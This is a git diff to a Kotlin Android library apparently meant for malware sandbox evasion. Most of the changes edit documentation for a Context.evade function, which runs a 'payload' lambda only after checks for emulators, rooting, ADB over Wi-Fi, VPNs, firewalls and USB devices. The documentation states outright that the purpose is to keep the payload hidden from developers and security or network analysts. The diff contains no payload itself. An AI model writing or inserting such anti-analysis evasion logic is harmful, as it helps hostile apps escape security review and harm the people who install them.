@@ -56,17 +56,18 @@ import javax.net.SocketFactory
  * @email evilthreads669966@gmail.com
  * @date 10/09/20
  *
- * [Context.Evade] is an asynchronous higher order function that takes a trailing lambda which is safe from behavioural analysis. Before the trailing lambda argument's block of code is executed there are numerous checks that happen before
+ * [Context.Evade] is an asynchronous higher order function that takes a trailing lambda containg a block of code called your payload which is only executed if it is safe from behavioural analysis. Before the trailing lambda argument's block of code is executed there are numerous checks that happen before
  * deciding whether to execute your code. All of these checks are in place to make sure that the user of your application is not a developer, cyber security analyst, or network analyst.
- * The evasion algorithm for checking whether it is safe runs the methods returning either false or true.
- * [isEmulator], [Context.isRooted], [Context.hasAdbOverWifi], [Context.isConnected], [Context.hasVpn], [Context.hasFirewall], [Context.hasUsbDevices]
- * All checks must return false in order for you block of code inside of the trailing lambda payload argument of [Context.evade] to run.
- * [Context.evade] provides two callbacks: onEscape and onSuccess which are provided by [OnEvade.Escape] and [OnEvade.Success] Unfortunately for now you must call [onEscape] before
+ * The evasion algorithm for checking whether it is safe to execute your payload runs multiple evasion check methods returning either false or true.
+ * [isEmulator], [isRooted], [hasAdbOverWifi], [isConnected], [hasVpn], [hasFirewall], [hasUsbDevices]
+ * All checks must return false in order for your block of code inside the trailing lambda payload argument of [Context.evade] to execute.
+ * [Context.evade] provides two callbacks: [onEscape] and [onSuccess] which are provided by [OnEvade.Escape] and [OnEvade.Success] Unfortunately for now you must call [onEscape] before
  * calling [onSuccess] which means that chaining these callbacks in that respective order is requirement.
- * You can bypass two evasion checks if you do not require networking by passing in false to the named argument [requiresNetwork]. Passing in false for [requiresNetwork]
- * allows [Context.evade] to execute your trailing lambda payload without checking [Context.hasFirewall] and [Context.hasVpn].
+ * You can bypass two evasion checks if you do not require networking by passing in false to the default named argument [requiresNetwork]. [requiresNetwork] has a default value of true. Passing in false for [requiresNetwork]
+ * allows [Context.evade] to execute your trailing lambda payload without checking [hasFirewall] and [hasVpn].
  * No dangerous permissions are required by this KTX function, so no permission requests are required. The required non-dangerous permissions are [Manifest.permission.INTERNET],
- * [Manifest.permission.ACCESS_NETWORK_STATE], and [Manifest.permission.ACCESS_WIFI_STATE] will be merged into your app's Android.manifest file when compiling.
+ * [Manifest.permission.ACCESS_NETWORK_STATE], and [Manifest.permission.ACCESS_WIFI_STATE] will be merged into your app's Android.manifest file
+ * when compiling.
  **/
 inline suspend fun Context.evade(dispatcher: CoroutineDispatcher = Dispatchers.Default, requiresNetwork: Boolean = true, crossinline payload: () -> Unit): OnEvade.Escape{
     lateinit var onEvade: OnEvade.Escape
@@ -90,7 +91,7 @@ inline suspend fun Context.evade(dispatcher: CoroutineDispatcher = Dispatchers.D
         }
         onEvade = OnEvade.Escape(false)
     }
-    return onEvade
+    return OnEvade.Escape(false)
 }
 
 class OnEvade{
